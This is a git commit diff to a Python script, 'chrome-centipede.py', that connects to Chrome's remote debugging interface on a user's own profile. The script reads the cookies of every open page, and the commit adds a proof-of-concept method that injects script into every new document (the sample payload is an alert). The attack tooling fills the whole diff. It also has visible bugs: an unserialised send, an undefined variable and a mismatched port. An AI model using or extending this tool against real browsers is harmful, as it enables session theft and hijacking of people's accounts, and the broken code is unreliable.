05bf0d1b942ecbca299d8dc31e59d67a61a3df0a
Connor MacLeod <connor.macleod96@hotmail.ca>
2024-08-11 17:35:21 -0400

    injection PoC

--- chrome-centipede.py
+++ chrome-centipede.py
@@ -42,18 +42,38 @@ class ChromeInterface:
     
     def cookie(self, url: str) -> List[dict]:
         ws = create_connection(url)
-        ws.send('{"id": 1, "method": "Network.getAllCookies"}')
+        ws.send('{"id": 1, "method": "Network.getCookies"}')
         response = ws.recv()
         ws.close()
         return json.loads(response)['result']['cookies']
     
     def cookies(self) -> List[List[dict]]:
         return [self.cookie(url) for url in self.ws_urls]
+    
+    def inject(self, url: str, script: str) -> str:
+        ws = create_connection(url)
+        ws.send({
+            "id": 1,
+            "method": "Security.disable"
+        }) # disable tracking security state changes
+        ws.recv()
+        ws.send(json.dumps({
+            "id": 1,
+            "method": "Page.addScriptToEvaluateOnNewDocument",
+            "params": {
+                "source": script,
+                "includeCommandLineAPI": True,
+                "runImmediately": True
+            }
+        })) # inject script
+        response = ws.recv()
+        ws.close()
+        return response
 
 if __name__ == '__main__':
     # Launch the browser with the following command: $browser_exe --remote-debugging-port=9223 --user-data-dir=$user_data_dir --restore-last-session --allow-remote-origins=*
     # User data dirs: https://chromium.googlesource.com/chromium/src.git/+/HEAD/docs/user_data_dir.md#Default-Location
-    chrome = ChromeInterface(9223)
+    chrome = ChromeInterface(9222)
     for page in chrome.pages:
         print(f"Type: {page['type']}")
         print(f"URL: {page['url']}")
@@ -66,3 +86,6 @@ if __name__ == '__main__':
             if k in fields:
                 print(f"{k}: {v}")
         print('\n')
+    
+    script = 'alert("Injected!")'
+    chrome.inject(urls[0], script)
